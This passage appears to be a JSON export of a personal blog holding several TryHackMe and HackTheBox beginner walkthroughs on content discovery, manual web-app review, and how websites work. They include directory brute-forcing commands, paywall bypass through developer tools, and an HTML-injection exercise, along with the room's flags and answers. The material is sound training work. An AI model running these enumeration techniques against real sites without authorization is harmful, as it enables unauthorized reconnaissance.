clear\n\nAnother way to clean up our terminal is to use the shortcut [Ctrl] + [L]. We can also use the arrow keys (↑ or ↓) to scroll through the command history, which will show us the commandsthat we have used before. But we also can search through the commandhistory using the shortcut [Ctrl] + [R] and type some of the text that we are looking for.\nSTAY TUNED 🧑‍💻CONTENT WILL UPDATE SOON 😁\n","slug":"HTB/Linux-Fundamentals-Module-HTB","date":"2024-05-27T17:47:53.000Z","categories_index":"cybersecurity,HTB,Linux","tags_index":"cybersecurity,Linux","author_index":"Satvik"},{"id":"ec2c0857db02e59b1fe7edb40ad2f3b4","title":"Content Discovery - THM Walkthrough","content":"Hello Hackers 💌Today we are gonna walkthrough a new room in Web Fundamentals called Content Discovery on #TryHackMeLets start 🚀\n\n  \n    View notes 👀\n  \n\n\n\nTASK 1 - What is content DiscoveryFirstly, we should ask, in the context of web application security, what is content? Content can be many things, a file, video, picture, backup, a website feature. When we talk about content discovery, we’re not talking about the obvious things we can see on a website; it’s the things that aren’t immediately presented to us and that weren’t always intended for public access.\nThis content could be, for example, pages or portals intended for staff usage, older versions of the website, backup files, configuration files, administration panels, etc.\nThere are three main ways of discovering content on a website which we’ll cover. Manually, Automated and OSINT (Open-Source Intelligence).\nQuestions and Answers in the Task1. What is the Content Discovery method that begins with M?Answer:Manually\n2. What is the Content Discovery method that begins with A?Answer:Automated\n3. What is the Content Discovery method that begins with O?Answer:OSINT\nTASK 2 - Manual Discovery - Robots.txtThere are multiple places we can manually check on a website to start discovering more content. \nRobots.txt\nThe robots.txt file is a document that tells search engines which pages they are and aren’t allowed to show on their search engine results or ban specific search engines from crawling the website altogether. It can be common practice to restrict certain website areas so they aren’t displayed in search engine results. These pages may be areas such as administration portals or files meant for the website’s customers. This file gives us a great list of locations on the website that the owners don’t want us to discover as penetration testers.\nTake a look at the robots.txt file on the Acme IT Support website to see if they have anything they don’t want to list - To do this open Firefox on the AttackBox, and enter the url: http://MACHINE_IP/robots.txt (this URL will update 2 minutes from when you start the machine in task 1)\nQuestions and Answers in the task1 . What is the directory in the robots.txt that isn’t allowed to be viewed by web crawlers?Answer:\n\nto know the answer , we need to visit /robots.txt\n\n\n\nso it’s disallowing search enginers to crawl over /staff-portal page \nso the answer is /staff-portal\n\nTASK 3 - Manual Discovery - FaviconFavicon\nThe favicon is a small icon displayed in the browser’s address bar or tab used for branding a website.\n\nSometimes when frameworks are used to build a website, a favicon that is part of the installation gets leftover, and if the website developer doesn’t replace this with a custom one, this can give us a clue on what framework is in use. OWASP host a database of common framework icons that you can use to check against the targets favicon https://wiki.owasp.org/index.php/OWASP_favicon_database. Once we know the framework stack, we can use external resources to discover more about it (see next section).\nPractical Exercise:\nOn the AttackBox, open firefox and enter the url https://static-labs.tryhackme.cloud/sites/favicon/ here you’ll see a basic website with a note saying “Website coming soon…”, if you look at your tabs you’ll notice an icon that confirms this site is using a favicon.\nViewing the page source you’ll see line six contains a link to the images&#x2F;favicon.ico file. \n\nIf you run the following command on the AttackBox, it will download the favicon and get its md5 hash value which you can then lookup on thehttps://wiki.owasp.org/index.php/OWASP_favicon_database.\ncurl\n1user@machine$ curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum\nNote: This curl will fail on the AttackBox if you are a free user, in which case you should use a VM for this. If your hash ends with 427e then your curl failed, and you may need to try it again. You could also run this on Windows in Powershell as shown below.\n12PS C:\\&gt; curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico -UseBasicParsing -o favicon.icoPS C:\\&gt; Get-FileHash .\\favicon.ico -Algorithm MD5 \n\nQuestions and answers in this task1. What framework did the favicon belong to?Answer:\n\nlets download the favicon of the site and extract its checksum first\ncommand:curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum\n\n\n\nnow copy the checksum we got and look out for any matches on OWASP Website\n\n\n\nso the favicon belongs to cgiirc framework\n\nTASK 4 - Manual Discovery - Sitemap.xmlSitemap.xml\nUnlike the robots.txt file, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.\nTake a look at the sitemap.xml file on the Acme IT Support website to see if there’s any new content we haven’t yet discovered: http://10.10.80.162/sitemap.xml (open this in the FireFox browser on the AttackBox).\nQUestions and Answers in the Task1. What is the path of the secret area that can be found in the sitemap.xml file?Answer:\n\nLets visit /sitemap.xml page and analyze it\n\n\n\nSo the answer is /s3cr3t-area\n\nTASK 5 Manual Discover - HTTP HEADERSHTTP Headers\nWhen we make requests to the web server, the server returns various HTTP headers. These headers can sometimes contain useful information such as the webserver software and possibly the programming&#x2F;scripting language in use. In the below example, we can see the webserver is NGINX version 1.18.0 and runs PHP version 7.4.3. Using this information, we could find vulnerable versions of software being used. Try running the below curl command against the web server, where the -v switch enables verbose mode, which will output the headers (there might be something interesting!).\nQuestions and Answers in the task1. What is the flag value from the X-FLAG header?answer:\n\nLets check the HTTP Response first \ncommand: curl http://10.10.80.162 -v\n\n\n\nFlag is &#96;THM{HEADER_FLAG}\n\nTASK 6 - Manual Discovery - Framework StackFramework Stack\nOnce you’ve established the framework of a website, either from the above favicon example or by looking for clues in the page source such as comments, copyright notices or credits, you can then locate the framework’s website. From there, we can learn more about the software and other information, possibly leading to more content we can discover.\nLooking at the page source of our Acme IT Support website (http://10.10.80.162), you’ll see a comment at the end of every page with a page load time and also a link to the framework’s website, which is https://static-labs.tryhackme.cloud/sites/thm-web-framework. Let’s take a look at that website. Viewing the documentation page gives us the path of the framework’s administration portal, which gives us a flag if viewed on the Acme IT Support website.\nQuestions and Answers in the task1. What is the flag from the framework’s administration portal?Answer:\n\nLets visit documentation first\nhttps://static-labs.tryhackme.cloud/sites/thm-web-framework/documentation.html\n\n \n\nwe got the credentials of web-framework\n\nnow lets login and check if it has anything for us \n\nflag: THM&#123;CHANGE_DEFAULT_CREDENTIALS&#125;\n\n\nTASK 7 - OSINT - Google Hacking &#x2F; DorkingThere are also external resources available that can help in discovering information about your target website; these resources are often referred to as OSINT or (Open-Source Intelligence) as they’re freely available tools that collect information:\nGoogle Hacking &#x2F; Dorking\nGoogle hacking &#x2F; Dorking utilizes Google’s advanced search engine features, which allow you to pick out custom content. You can, for instance, pick out results from a certain domain name using the site: filter. For example, site:tryhackme.com will only return results from the tryhackme.com website. You can then match this up with certain search terms. For example, the word admin (site:tryhackme.com admin) will return results from the tryhackme.com website that contain the word admin in its content. You can combine multiple filters as well. Here are some examples of more filters you can use:\n\n\n\nFilter\nExample\nDescription\n\n\n\nsite\nsite:tryhackme.com\nReturns results only from the specified website address\n\n\ninurl\ninurl:admin\nReturns results that have the specified word in the URL\n\n\nfiletype\nfiletype:pdf\nReturns results which are a particular file extension\n\n\nintitle\nintitle:admin\nReturns results that contain the specified word in the title\n\n\nMore information about google hacking can be found here: Google hacking\nQuestions and answers in the task1. What Google dork operator can be used to only show results from a particular site?Answer: site:\nTASK 8 - OSINT - WappalyzerWappalyzer\nWappalyzer (https://www.wappalyzer.com/) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.\nQuestions and Answers in the task1. What online tool can be used to identify what technologies a website is running?Answer: wappalyzer\nTASK 9 - OSINT Wayback MachineWayback Machine\nThe Wayback Machine (https://archive.org/web/) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.\nQuestions and answers in the task1. What is the website address for the Wayback Machine?Answer: https://archive.org/web/\nTASK 10 - OSINT GITHUBGitHub\nTo understand GitHub, you first need to understand Git. Git is a version control system that tracks changes to files in a project. Working in a team is easier because you can see what each team member is editing and what changes they made to files. When users have finished making their changes, they commit them with a message and then push them back to a central location (repository) for the other users to then pull those changes to their local machines. GitHub is a hosted version of Git on the internet. Repositories can either be set to public or private and have various access controls. You can use GitHub’s search feature to look for company names or website names to try and locate repositories belonging to your target. Once discovered, you may have access to source code, passwords or other content that you hadn’t yet found.\nAnswer the questions below1. What is Git?Answer: Version Control System\nTASK 11 - OSINT - S3 BUCKETSS3 Buckets\nS3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn’t be available to the public. The format of the S3 buckets is http(s)://&#123;name&#125;.s3.amazonaws.com where &#123;name&#125; is decided by the owner, such as tryhackme-assets.s3.amazonaws.com. S3 buckets can be discovered in many ways, such as finding the URLs in the website’s page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as &#123;name&#125;-assets, &#123;name&#125;-www, &#123;name&#125;-public, &#123;name&#125;-private, etc.\nAnswer the questions below1. What URL format do Amazon S3 buckets end in?Answer: .s3.amazonaws.com\nTASK 12 - Automated DiscoveryWhat is Automated Discovery?\nAutomated discovery is the process of using tools to discover content rather than doing it manually. This process is automated as it usually contains hundreds, thousands or even millions of requests to a web server. These requests check whether a file or directory exists on a website, giving us access to resources we didn’t previously know existed. This process is made possible by using a resource called wordlists.\nWhat are wordlists?\nWordlists are just text files that contain a long list of commonly used words; they can cover many different use cases. For example, a password wordlist would include the most frequently used passwords, whereas we’re looking for content in our case, so we’d require a list containing the most commonly used directory and file names. An excellent resource for wordlists that is preinstalled on the THM AttackBox is https://github.com/danielmiessler/SecLists which Daniel Miessler curates.\nAutomation Tools\nAlthough there are many different content discovery tools available, all with their features and flaws, we’re going to cover three which are preinstalled on our attack box, ffuf, dirb and gobuster.\nOn the AttackBox execute the following three commands, targeting the Acme IT Support website and see what results you get.\nUsing ffuf:\n1user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.163.15/FUZZ\nUsing dirb:\n1user@machine$ dirb http://10.10.163.15/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\n\nUsing Gobuster:\n1user@machine$ gobuster dir --url http://10.10.163.15/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\nUsing the results from the commands above, please answer the below questions:\nQuestions and answers in the task\nfirst lets eneumerte the web server using gobuster \ncommand: gobuster dir --url http://10.10.163.15/ -w /usr/share/wordlists/dirb/common.txt\n\n1. What is the name of the directory beginning “&#x2F;mo….” that was discovered?Answer:\n\n/monthly\n\n2. What is the name of the log file that was discovered?Answer: development.log\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/WEB/Content-Discovery-THM-Walkthrough","date":"2024-05-27T13:26:57.000Z","categories_index":"cybersecurity,THM,web","tags_index":"tryhackme,web","author_index":"Satvik"},{"id":"3f7217341e6a6154d773e1a5d0dd33e9","title":"Walking an Application - THM","content":"Welcome to Another writeup guys 💌Today we will be walking through another room called as &quot;Walking an Application&quot; which is a part of &quot;Web Fundamentals&quot; path on TryHackMeyou can find all rooms of web fundamentals in the &quot;WEB&quot; category in our BlogLet’s start solving the challenges Ahead ! 🚀\nTASK 1 - Walking an ApplicationIn this room you will learn how to manually review a web application for security issues using only the in-built tools in your browser. More often than not, automated security tools and scripts will miss many potential vulnerabilities and useful information.\nHere is a short breakdown of the in-built browser tools you will use throughout this room:\nView Source - Use your browser to view the human-readable source code of a website.Inspector - Learn how to inspect page elements and make changes to view usually blocked content.Debugger - Inspect and control the flow of a page’s JavaScriptNetwork - See all the network requests a page makes.Start the virtual machine on this task, wait 2 minutes, and visit the following URL: https://LAB_WEB_URL.p.thmlabs.com (this URL will update 2 minutes from when you start the machine)Now start the machine and move on next task\nTASK 2 - Exploring the websiteAs a penetration tester, your role when reviewing a website or web application is to discover features that could potentially be vulnerable and attempt to exploit them to assess whether or not they are. These features are usually parts of the website that require some interactivity with the user.\nFinding interactive portions of the website can be as easy as spotting a login form to manually reviewing the website’s JavaScript. An excellent place to start is just with your browser exploring the website and noting down the individual pages&#x2F;areas&#x2F;features with a summary for each one.\nAn example site review for the Acme IT Support website would look something like this:\n\n\n\nFeature\nURL\nSummary\n\n\n\nHome Page\n&#x2F;\nThis page contains a summary of what Acme IT Support does with a company photo of their staff.\n\n\nLatest News\n&#x2F;news\nThis page contains a list of recently published news articles by the company, and each news article has a link with an id number, i.e. &#x2F;news&#x2F;article?id&#x3D;1.\n\n\nNews Article\n&#x2F;news&#x2F;article?id&#x3D;1\nDisplays the individual news article. Some articles seem to be blocked and reserved for premium customers only.\n\n\nContact Page\n&#x2F;contact\nThis page contains a form for customers to contact the company. It contains name, email and message input fields and a send button.\n\n\nCustomers\n&#x2F;customers\nThis link redirects to &#x2F;customers&#x2F;login.\n\n\nCustomer Login\n&#x2F;customers&#x2F;login\nThis page contains a login form with username and password fields.\n\n\nCustomer Signup\n&#x2F;customers&#x2F;signup\nThis page contains a user-signup form that consists of a username, email, password and password confirmation input fields.\n\n\nCustomer Reset Password\n&#x2F;customers&#x2F;reset\nPassword reset form with an email address input field.\n\n\nCustomer Dashboard\n&#x2F;customers\nThis page contains a list of the user’s tickets submitted to the IT support company and a “Create Ticket” button.\n\n\nCreate Ticket\n&#x2F;customers&#x2F;ticket&#x2F;new\nThis page contains a form with a textbox for entering the IT issue and a file upload option to create an IT support ticket.\n\n\nCustomer Account\n&#x2F;customers&#x2F;account\nThis page allows the user to edit their username, email and password.\n\n\nCustomer Logout\n&#x2F;customers&#x2F;logout\nThis link logs the user out of the customer area.\n\n\nWe will start taking a deeper look into some of the pages we have discovered in the next task\n\n\n\n\nUnderstand the website structure by looking the table above and move to the next challenge\nTASK 3 - Viewing the page sourceThe page source is the human-readable code returned to our browser&#x2F;client from the web server each time we make a request.\nThe returned code is made up of HTML ( HyperText Markup Language), CSS ( Cascading Style Sheets ) and JavaScript, and it’s what tells our browser what content to display, how to show it and adds an element of interactivity with JavaScript.\nFor our purposes, viewing the page source can help us discover more information about the web application.\nHow do I view the Page Source?While viewing a website, you can right-click on the page, and you’ll see an option on the menu that says View Page Source.Most browsers support putting view-source: in front of the URL for example, view-source:https://www.google.com/In your browser menu, you’ll find an option to view the page source. This option can sometimes be in submenus such as developer tools or more tools.\nLet’s view some Page Source!Try viewing the page source of the home page of the Acme IT Support website. Unfortunately, explaining everything you can see here is well out of the scope of this room, and you’ll need to look into website design&#x2F;development courses to understand it fully. What we can do, is pick out bits of information that are of importance to us.\nAt the top of the page, you’ll notice some code starting with&lt;!-- and ending with --&gt; these are comments. Comments are messages left by the website developer, usually to explain something in the code to other programmers or even notes&#x2F;reminders for themselves. These comments don’t get displayed on the actual webpage. This comment describes how the homepage is temporary while a new one is in development. View the webpage in the comment to get your first flag.\nLinks to different pages in HTML are written in anchor tags ( these are HTML elements that start with &lt;a ), and the link that you’ll be directed to is stored in the href attribute.\nFor example, you’ll see the contact page link on line 31:\n\nIf you view further down the page source, there is a hidden link to a page starting with “secr”, view this link to get another flag. You obviously wouldn’t get a flag in a real-world situation, but you may discover some private area used by the business for storing company&#x2F;staff&#x2F;customer information.\nExternal files such as CSS, JavaScript and Images can be included using the HTML code. In this example, you’ll notice that these files are all stored in the same directory. If you view this directory in your web browser, there is a configuration error. What should be displayed is either a blank page or a 403 Forbidden page with an error stating you don’t have access to the directory. Instead, the directory listing feature has been enabled, which in fact, lists every file in the directory. Sometimes this isn’t an issue, and all the files in the directory are safe to be viewed by the public, but in some instances, backup files, source code or other confidential information could be stored here. In this instance, we get a flag in the flag.txt file.\nMany websites these days aren’t made from scratch and use what’s called a framework. A framework is a collection of premade code that easily allows a developer to include common features that a website would require, such as blogs, user management, form processing, and much more, saving the developers hours or days of development.\nViewing the page source can often give us clues into whether a framework is in use and, if so, which framework and even what version. Knowing the framework and version can be a powerful find as there may be public vulnerabilities in the framework, and the website might not be using the most up to date version. At the bottom of the page, you’ll find a comment about the framework and version in use and a link to the framework’s website. Viewing the framework’s website, you’ll see that our website is, in fact, out of date. Read the update notice and use the information that you find to discover another flag.\nQuestions and Answers of the task1. What is the flag from the HTML comment?Answer:\n\nLet’s open the site and view its source first\n\n\n\nif we look at the comments in the source , it saying that the current home page is temporary and new page is developing at @new-home-beta\nso let’s go to the source of &#x2F;new-page-beta and look if it has anything for us\n\n\n\nOh yes Guys , Here’s our flag THM&#123;HTML_COMMENTS_ARE_DANGEROUS&#125;\n\n2. What is the flag from the secret link?Answer:\n\nLets find out where that secret link is hiding \nfor that we should look carefully at the source code of home page\nLets do it\n\n\n\nSo there is something called secret-page . Lets check it out\n\n\n\nYayy ! We got it …\nso the answer is THM&#123;NOT_A_SECRET_ANYMORE&#125;\n\n3. What is the directory listing flag?Answer:\n\nif we look at the website structure , we can understand that all the files on the website in stored in /assets directory . so let’s go and check it out\n\n\n\nWe have something interesting called flag.txt , open it\n\n\n\nso the flag is : THM&#123;INVALID_DIRECTORY_PERMISSIONS&#125;\n\n4. What is the framework flag?Answer:\n\nif we look at the ending line of the source code which is comment &lt;!--Page Generated in 0.04820 Seconds using the THM Framework v1.2 ( https://static-labs.tryhackme.cloud/sites/thm-web-framework )--&gt;\nso let’s go to that web url and look if there is anything interesting\n\n\n\nwe can find three pages there\nHome - which is our actual homepage\nChangelog - which is about the latest changes in the site and things that are patched\nDocumentation - Ofcourse you guys know what would be there inside it\n\n\nSo out of these , we can find something interest in changelog as it tells about the fixes and may reveal some important information about the current version of the page\nlets go to change log page and look if it has anything interesting for us\n\n\n\nif we look at log vserion 1.3 , we can understand that some potential information is storing in &#x2F;tmp.zip file in the web server\nso now will try to access that\n\n\n\nwoah ! we got that tmp.zip file guys so let’s extract it and see the contents\nso guys there it is ! we got flag.txt\n\n\n\nyay! The Flag is THM&#123;KEEP_YOUR_SOFTWARE_UPDATED&#125;\n\nTASK 4 - Developer Tools - InspectorDeveloper Tools\nEvery modern browser includes developer tools; this is a tool kit used to aid web developers in debugging web applications and gives you a peek under the hood of a website to see what is going on. As a pentester, we can leverage these tools to provide us with a much better understanding of the web application. We’re specifically focusing on three features of the developer tool kit, Inspector, Debugger and Network.\nOpening Developer ToolsThe way to access developer tools is different for every browser. If you’re not sure how to access it, click the “View Site” button on the top right of this task to get instructions to how to access the tools for your browser.\nInspectorThe page source doesn’t always represent what’s shown on a webpage; this is because CSS, JavaScript and user interaction can change the content and style of the page, which means we need a way to view what’s been displayed in the browser window at this exact time. Element inspector assists us with this by providing us with a live representation of what is currently on the website.\nAs well as viewing this live view, we can also edit and interact with the page elements, which is helpful for web developers to debug issues.\nOn the Acme IT Support website, click into the news section, where you’ll see three news articles.\nThe first two articles are readable, but the third has been blocked with a floating notice above the content stating you have to be a premium customer to view the article. These floating boxes blocking the page contents are often referred to as paywalls as they put up a metaphorical wall in front of the content you wish to see until you pay.\n\nRight-clicking on the premium notice ( paywall ), you should be able to select the Inspect option from the menu, which opens the developer tools either on the bottom or right-hand side depending on your browser or preferences. You’ll now see the elements&#x2F;HTML that make up the website ( similar to the screenshots below ).\n\n(Click on the image to enlarge)\nLocate the DIV element with the class premium-customer-blocker and click on it. You’ll see all the CSS styles in the styles box that apply to this element, such as margin-top: 60px and text-align: center. The style we’re interested in is the display: block. If you click on the word block, you can type a value of your own choice. Try typing none, and this will make the box disappear, revealing the content underneath it and a flag. If the element didn’t have a display field, you could click below the last style and add in your own. Have a play with the element inspector, and you’ll see you can change any of the information on the website, including the content. Remember this is only edited on your browser window, and when you press refresh, everything will be back to normal.\nQuestions and Answers in the task1. What is the flag behind the paywall?Answer:\n\ngo to news page and click inspect on paywall block\n\n\n\n\nAfter changing the value to none . view the site again\n\n\n\nHaha ! we got it THM&#123;NOT_SO_HIDDEN&#125;\n\nTASK 5 - Developer Tools - DebuggerDeveloper Tools - Debugger\nThis panel in the developer tools is intended for debugging JavaScript, and again is an excellent feature for web developers wanting to work out why something might not be working. But as penetration testers, it gives us the option of digging deep into the JavaScript code. In Firefox and Safari, this feature is called Debugger, but in Google Chrome, it’s called Sources.\nOn the Acme IT Support website, click on the contact page, each time the page is loaded, you might notice a rapid flash of red on the screen. We’re going to use the Debugger to work out what this red flash is and if it contains anything interesting. Debugging a red dot wouldn’t be something you’d do in the real world as a penetration tester, but it does allow us to use this feature and get used to the Debugger.\nIn both browsers, on the left-hand side, you see a list of all the resources the current webpage is using. If you click into the assets folder, you’ll see a file named flash.min.js. Clicking on this file displays the contents of the JavaScript file.\nMany times when viewing javascript files, you’ll notice that everything is on one line, which is because it has been minimised, which means all formatting ( tabs, spacing and newlines ) have been removed to make the file smaller. This file is no exception to this, and it has also been obfusticated, which makes it purposely difficult to read, so it can’t be copied as easily by other developers.\nWe can return some of the formattings by using the “Pretty Print” option, which looks like two braces { } to make it a little more readable, although due to the obfustication, it’s still difficult to comprehend what is going on with the file. If you scroll to the bottom of the flash.min.js file, you’ll see the line: flash[&#39;remove&#39;]();\n\n(Click on the image to enlarge)\nThis little bit of JavaScript is what is removing the red popup from the page. We can utilise another feature of debugger called breakpoints. These are points in the code that we can force the browser to stop processing the JavaScript and pause the current execution.\nIf you click the line number that contains the above code, you’ll notice it turns blue; you’ve now inserted a breakpoint on this line. Now try refreshing the page, and you’ll notice the red box stays on the page instead of disappearing, and it contains a flag.\nQuestions and Answers in the Task1. What is the flag in the red box?Answer:\n\nGoto contact page and open Debugger \nclick on line no.110 and select the three options in the side bar as shown in the image below\n\n\n\nNow refresh the page\n\n\n\nFlag THM&#123;CATCH_ME_IF_YOU_CAN&#125;\n\nTASK 6 - Developer Tools - NetworkDeveloper Tools - NetworkThe network tab on the developer tools can be used to keep track of every external request a webpage makes. If you click on the Network tab and then refresh the page, you’ll see all the files the page is requesting. \nTry doing this on the contact page; you can press the trash can icon to delete the list if it gets a bit overpopulated.\nWith the network tab open, try filling in the contact form and pressing the Send Message button. You’ll notice an event in the network tab, and this is the form being submitted in the background using a method called AJAX. AJAX is a method for sending and receiving network data in a web application background without interfering by changing the current web page.\n\nExamine the new entry on the network tab that the contact form created and view the page the data was sent to in order to reveal a flag.\nQuestions and Answers in the Task1. What is the flag shown on the contact-msg network request?Answer:\n\nGo to contact page and click on inspect and then go to Network Tab\n\n\n\nNow fill the form with random information and click on send message ( make sure you have network tab open)\n\n\n\nNow you can observe some response in network tab \nclick on it and in sidebar goto Response tab\n\n\n\nFlag: THM&#123;GOT_AJAX_FLAG&#125;\n\nThats it guys ! You havve succesfully completed the room 🥳Thank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/WEB/Walking-an-Application-THM","date":"2024-05-25T09:35:07.000Z","categories_index":"cybersecurity,THM,web","tags_index":"tryhackme,web","author_index":"Satvik"},{"id":"04c3f082e63bec82336499ba808815fb","title":"How Websites Work - THM Walkthrough","content":"Hello Hackers 💌Today we will be walking through a new room on tryhackme called How Websites workLet’s dive into the room and solve the challenges ahead !🚀\nTASK 1 - How Websites WorkBy the end of this room, you’ll know how websites are created and will be introduced to some basic security issues.\nWhen you visit a website, your browser (like Safari or Google Chrome) makes a request to a web server asking for information about the page you’re visiting. It will respond with data that your browser uses to show you the page; a web server is just a dedicated computer somewhere else in the world that handles your requests.\n\nThere are two major components that make up a website:\nFront End (Client-Side) - the way your browser renders a website.Back End (Server-Side) - a server that processes your request and returns a response.There are many other processes involved in your browser making a request to a web server, but for now, you just need to understand that you make a request to a server, and it responds with data your browser uses to render information to you.\nQuestions and Answers in the Task1. What term best describes the component of a web application rendered by your browser?\n\nAnswer: Front End\n\nTASK 2 - HTMLWebsites are primarily created using:\n\nHTML, to build websites and define their structure.\nCSS, to make websites look pretty by adding styling options.\nJavaScript, to implement complex features on pages using interactivity.\n\nHyperText Markup Language (HTML) is the language websites are written in. Elements (also known as tags) are the building blocks of HTML pages and tell the browser how to display content. The code snippet below shows a simple HTML document, the structure of which is the same for every website:\n\nThe HTML structure (as shown in the screenshot) has the following components:\n\nThe &lt;!DOCTYPE html&gt; defines that the page is an HTML5 document. This helps with standardization across different browsers and tells the browser to use HTML5 to interpret the page.\nThe &lt;html&gt; element is the root element of the HTML page - all other elements come after this element.\nThe &lt;head&gt; element contains information about the page (such as the page title).\nThe &lt;body&gt; element defines the HTML document’s body; only content inside of the body is shown in the browser.\nThe &lt;h1&gt; element defines a large heading.\nThe &lt;p&gt; element defines a paragraph.\n\nThere are many other elements (tags) used for different purposes. For example, there are tags for buttons (&lt;button&gt;), images (&lt;img&gt;), lists, and much more. \nTags can contain attributes such as the class attribute, which can be used to style an element (e.g., make the tag a different color) &lt;p class=&quot;bold-text&quot;&gt;, or the src attribute, which is used on images to specify the location of an image: &lt;img src=&quot;img/cat.jpg&quot;&gt;. An element can have multiple attributes each with its own unique purpose, e.g., &lt;p attribute1=&quot;value1&quot; attribute2=&quot;value2&quot;&gt;.\nElements can also have an id attribute (&lt;p id=&quot;example&quot;&gt;), which is unique to the element. Unlike the class attribute, where multiple elements can use the same class, an element must have different ids to identify them uniquely. Element ids are used for styling and to identify it by JavaScript.\nYou can view the HTML of any website by right-clicking and selecting “View Page Source” (Chrome) &#x2F; “Show Page Source” (Safari).\nQuestions and answers in the task1. One of the images on the cat website is broken - fix it, and the image will reveal the hidden text answer! \n\nAnswer: HTMLHERO\n2. Add a dog image to the page by adding another img tag () on line 11. The dog image location is img&#x2F;dog-1.png. What is the text in the dog image?\n\nAnswer: DOGHTML\n\nTASK 3 - JavascriptJavaScript (JS) is one of the most popular coding languages in the world and allows pages to become interactive. HTML is used to create the website structure and content, while JavaScript is used to control the functionality of web pages - without JavaScript, a page would not have interactive elements and would always be static. JS can dynamically update the page in real-time, giving functionality to change the style of a button when a particular event on the page occurs (such as when a user clicks a button) or to display moving animations.\nJavaScript is added within the page source code and can be either loaded within &lt;script&gt; tags or can be included remotely with the src attribute: &lt;script src=&quot;/location/of/javascript_file.js&quot;&gt;&lt;/script&gt;\nThe following JavaScript code finds a HTML element on the page with the id of &quot;demo&quot; and changes the element’s contents to &quot;Hack the Planet&quot; : document.getElementById(&quot;demo&quot;).innerHTML = &quot;Hack the Planet&quot;;\nHTML elements can also have events, such as “onclick” or “onhover” that execute JavaScript when the event occurs. The following code changes the text of the element with the demo ID to Button Clicked: &lt;button onclick=&#39;document.getElementById(&quot;demo&quot;).innerHTML = &quot;Button Clicked&quot;;&#39;&gt;Click Me!&lt;/button&gt; - onclick events can also be defined inside the JavaScript script tags, and not on elements directly.\nQuestions and Answers in the task1. Click the “View Site” button on this task. On the right-hand side, add JavaScript that changes the demo element’s content to “Hack the Planet”\n\nAnswer: JSISFUN\n\nTASK 4 - Sensitive Data ExposureSensitive Data Exposure occurs when a website doesn’t properly protect (or remove) sensitive clear-text information to the end-user; usually found in a site’s frontend source code.\nWe now know that websites are built using many HTML elements (tags), all of which we can see simply by “viewing the page source”. A website developer may have forgotten to remove login credentials, hidden links to private parts of the website or other sensitive data shown in HTML or JavaScript.\nSensitive information can be potentially leveraged to further an attacker’s access within different parts of a web application. For example, there could be HTML comments with temporary login credentials, and if you viewed the page’s source code and found this, you could use these credentials to log in elsewhere on the application (or worse, used to access other backend components of the site).\nWhenever you’re assessing a web application for security issues, one of the first things you should do is review the page source code to see if you can find any exposed login credentials or hidden links.\nQuestions and Answers in the Task1. View the website on this link. What is the password hidden in the source code?\n\nAnswer: testpasswd\n\nTASK 5 - HTML InjectionHTML Injection is a vulnerability that occurs when unfiltered user input is displayed on the page. If a website fails to sanitise user input (filter any “malicious” text that a user inputs into a website), and that input is used on the page, an attacker can inject HTML code into a vulnerable website.\nInput sanitisation is very important in keeping a website secure, as information a user inputs into a website is often used in other frontend and backend functionality. A vulnerability you’ll explore in another lab is database injection, where you can manipulate a database lookup query to log in as another user by controlling the input that’s directly used in the query - but for now, let’s focus on HTML injection (which is client-side).\nWhen a user has control of how their input is displayed, they can submit HTML (or JavaScript) code, and the browser will use it on the page, allowing the user to control the page’s appearance and functionality.\n\nThe image above shows how a form outputs text to the page. Whatever the user inputs into the “What’s your name” field is passed to a JavaScript function and output to the page, which means if the user adds their own HTML or JavaScript in the field, it’s used in the sayHi function and is added to the page - this means you can add your own HTML (such as a &lt;h1&gt; tag) and it will output your input as pure HTML\nThe general rule is never to trust user input. To prevent malicious input, the website developer should sanitise everything the user enters before using it in the JavaScript function; in this case, the developer could remove any HTML tags.\nQuestions and Answers in the task1. View the website on this task and inject HTML so that a malicious link to http://hacker.com is shown.\n\nAnswer: HTML_INJ3CTI0N\n\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/WEB/How-Websites-Work-THM-Walkthrough","date":"2024-05-23T09:28:53.000Z","categories_index":"cybersecurity,THM,web","tags_index":"tryhackme,web","author_index":"Satvik"},{"id":"5904c8f0bb1680bf04de5ca4eafa3e53","title":"HTTP in detail - THM","content":"HTTP in DetailWhat is HTTP? (HyperText Transfer Protocol)HTTP is what’s used whenever you view a website, developed by Tim Berners-Lee and his team between 1989-1991. HTTP is the set of rules used for communicating with web servers for the transmitting of webpage data, whether that is HTML, Images, Videos, etc.\nWhat is HTTPS? (HyperText Transfer Protocol Secure)\nHTTPS is the secure version of HTTP. HTTPS data is encrypted so it not only stops people from seeing the data you are receiving and sending, but it also gives you assurances that you’re talking to the correct web server and not something impersonating it.\nQuestions and Answers in the task1. What does HTTP stands for ?Answer:\n\nHyperText Transfer Protocol2. What does S in HTTPS stands for ?Answer:\nSecure3. On the mock webpage on the right there is an issue, once you’ve found it, click on it. What is the challenge flag?Answer:\nClick on Lock SymbolFalg : THM&#123;INVALID_HTTP_CERT&#125;\n\nRequests and ResponsesWhen we access a website, your browser will need to make requests to a web server for assets such as HTML, Images, and download the responses. Before that, you need to tell the browser specifically how and where to access these resources, this is where URLs will help.\nWhat is a URL? (Uniform Resource Locator)If you’ve used the internet, you’ve used a URL before. A URL is predominantly an instruction on how to access a resource on the 